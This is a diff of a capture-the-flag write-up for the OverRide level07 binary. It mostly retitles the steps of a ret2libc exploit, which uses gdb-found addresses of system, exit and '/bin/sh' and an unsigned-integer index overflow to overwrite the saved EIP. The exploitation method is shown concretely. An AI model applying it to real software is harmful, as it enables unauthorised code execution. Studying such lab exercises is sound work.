@@ -60,12 +60,12 @@ We also know the following:
 
 Our plan is to do a ret2libc attack, by overwriting the index containing EIP with a call to ```system()``` + ```exit()``` + ```"/bin/sh"```. 
 
-1) find the address of system, exit, /bin/sh
+1) find the address of system, exit, bin/sh
 2) calculate the 'index' of EIP
 3) use maxint overflow to access protected indexes
 4) run exploit by inputting malicious number + index to running program
 
-Let's do **step 1**. 
+**step 1**. 
 ```
 level07@OverRide:~$ gdb -q level07
 
@@ -94,7 +94,7 @@ Ok, here are our addresses:
 - ```"/bin/sh"``` is at ```0xf7f897ec```
 
 
-Let's do **step 2**. 
+**step 2** <br />
 We need to find the index in the table where we reach EIP, and then store our payload there using ```store_number()```. 
 
 The table's address is ```0xffffd4f4```.
@@ -121,6 +121,7 @@ Stack level 0, frame at 0xffffd6c0:
   eip at 0xffffd6bc
 ```
 
+**Step 3** <br />
 Next, we need to calculate the 'index' of our EIP address. 
 ```
   0xffffd63c   -    0xffffd474    =    int(0x1c8)  =   456
@@ -133,7 +134,6 @@ Next, we need to calculate the 'index' of our EIP address.
 ```
 Ah... index 114 is protected: ```114 % 3 = 0```. We can't store a number at this index. 
 
-**Step 3** <br />
 On lines 152-158 of the disassembled binary, we see that the table is accessed as ```data[index * 4]```. 
 Since the index is an unsigned int and multiplied by 4, we can overflow uintmax to give the index where we want to go. 
 ```
@@ -161,7 +161,8 @@ Program received signal SIGSEGV, Segmentation fault.
 0x41414141 in ?? ()
 ```
 
-So, let's structure our exploit:
+**Step 4** <br />
+Let's structure our exploit:
 ```
 [ address of EIP ] = [ address of system ] [ address of exit ] [ address of "/bin/sh" ]
    0xffffd6bc           0xf7e6aed0           0xf7e5eb70             0xf7f897ec          # address
